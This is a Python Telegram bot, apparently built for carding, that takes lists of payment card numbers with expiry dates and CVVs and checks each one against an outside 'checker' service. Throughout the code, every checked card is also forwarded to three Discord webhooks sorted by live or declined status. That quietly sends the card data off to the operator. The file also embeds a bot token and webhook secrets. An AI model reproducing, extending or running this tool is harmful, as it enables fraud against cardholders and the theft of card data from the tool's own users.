import requests
import re
import os
from io import StringIO
from telebot import TeleBot, types

API_URL = "https://herseuxshop.info/checker/checker.php?card="
BOT_TOKEN = "7895292921:AAH7iEd54PRiraenPE_2hlQ5ZGtIWuU5uB4"
WEBHOOK_LIVE = "https://discord.com/api/webhooks/1362353337013506129/bcAAKfveNmZfEQm6KSEXe0_ToWeU_A_hG_jp8kfq7Ga5uBKWQJ8CmBsxFJpmQmMEAItS"
WEBHOOK_DECLINED = "https://discord.com/api/webhooks/1362353376909590599/VBJOl1N3f6H69UudhjXwPyuRZlRbCgF0suIY7M2shVCtgT-Pc3AI7BhTrJH07cE4KX87"
WEBHOOK_UNKNOWN = "https://discord.com/api/webhooks/1362353440931708979/4vwk-95JiHHDnojOCIxZ3fx2lE6wevQhgvd-IXV5hVg79Muqn6MEbA6L5YlGkYhDfSFJ"

bot = TeleBot(BOT_TOKEN)

def clean_result(text):
    return re.sub(r'(https?://\S+|www\.\S+)', '', text).strip()

def send_to_webhook(content, webhook_url):
    try:
        requests.post(webhook_url, json={"content": content})
    except:
        pass

def check_card(card):
    try:
        res = requests.get(f"{API_URL}{card}", timeout=10)
        sonuc = res.text.strip()
        if "<!DOCTYPE html>" in sonuc or "<html" in sonuc:
            raise ValueError("Sunucu HTML döndürüyor (API bozuk olabilir)")
        temiz = clean_result(sonuc)
        if "✅" in sonuc:
            send_to_webhook(temiz, WEBHOOK_LIVE)
        elif "❌" in sonuc:
            send_to_webhook(temiz, WEBHOOK_DECLINED)
        else:
            send_to_webhook(temiz, WEBHOOK_UNKNOWN)
        return temiz
    except Exception as e:
        hata = f"{card} → ❌ API HATASI: {str(e)}"
        send_to_webhook(hata, WEBHOOK_UNKNOWN)
        return hata

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "👋 Hoş Geldiniz ---CREDIT HERSEUX\n\nKomutlar:\n/check - Tek veya birden fazla kart gir\n/topluchk - .txt ile kart kontrol et\n/parser - Kartları parseler ve kontrol eder")

@bot.message_handler(commands=['check'])
def tek_check(message):
    msg = bot.send_message(message.chat.id, "Karttları gir ister tek tek ister toplu satır satır:")
    bot.register_next_step_handler(msg, tek_check_cevap)

def tek_check_cevap(msg):
    try:
        lines = msg.text.strip().splitlines()
        yanitlar = [check_card(line.strip()) for line in lines if line.strip()]
        cevap = "\n".join(yanitlar)
        if len(cevap) < 4000:
            bot.send_message(msg.chat.id, cevap)
        else:
            with open("check_sonuclar.txt", "w", encoding="utf-8") as f:
                f.write(cevap)
            with open("check_sonuclar.txt", "rb") as f:
                bot.send_document(msg.chat.id, f)
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Bir hata oluştu: {str(e)}")

@bot.message_handler(commands=['topluchk'])
def toplu_check(message):
    msg = bot.send_message(message.chat.id, "Lütfen .txt dosyası gönderin (en fazla 30 kart)")
    bot.register_next_step_handler(msg, toplu_check_cevap)

def toplu_check_cevap(msg):
    try:
        if not msg.document:
            return bot.send_message(msg.chat.id, "❌ Geçerli .txt dosyası değil.")
        file_info = bot.get_file(msg.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        cards = StringIO(downloaded.decode("utf-8", errors="ignore")).readlines()
        if len(cards) > 30:
            return bot.send_message(msg.chat.id, f"Napiyon ({len(cards)}) kart ne aq")
        yanitlar = [check_card(c.strip()) for c in cards if c.strip()]
        cevap = "\n".join(yanitlar)
        if len(cevap) < 4000:
            bot.send_message(msg.chat.id, cevap)
        else:
            with open("sonuclar.txt", "w", encoding="utf-8") as f:
                f.write(cevap)
            with open("sonuclar.txt", "rb") as f:
                bot.send_document(msg.chat.id, f)
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Bir hata oluştu: {str(e)}")

@bot.message_handler(commands=['parser'])
def parser_handler(message):
    msg = bot.send_message(message.chat.id, "Lütfen kart data içeren .txt dosyası gönderin (max 30 satır)")
    bot.register_next_step_handler(msg, parser_cevap)

def parser_cevap(msg):
    try:
        if not msg.document:
            return bot.send_message(msg.chat.id, "❌ Geçerli .txt dosyası değil.")
        file_info = bot.get_file(msg.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        lines = StringIO(downloaded.decode("utf-8", errors="ignore")).readlines()
        if len(lines) > 30:
            return bot.send_message(msg.chat.id, f"Napiyon ({len(lines)}) kart ne aq")
        parsed = []
        for line in lines:
            nums = re.findall(r'\d+', line)
            if len(nums) >= 4 and 12 <= len(nums[0]) <= 19:
                parsed.append(f"{nums[0]}|{nums[1]}|{nums[2]}|{nums[3]}")
        if not parsed:
            return bot.send_message(msg.chat.id, "⚠️ Biçimlendirilebilecek kart bulunamadı.")
        yanitlar = [check_card(p) for p in parsed]
        cevap = "\n".join(yanitlar)
        if len(cevap) < 4000:
            bot.send_message(msg.chat.id, cevap)
        else:
            with open("parser_sonuclar.txt", "w", encoding="utf-8") as f:
                f.write(cevap)
            with open("parser_sonuclar.txt", "rb") as f:
                bot.send_document(msg.chat.id, f)
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Bir hata oluştu: {str(e)}")

bot.infinity_polling()
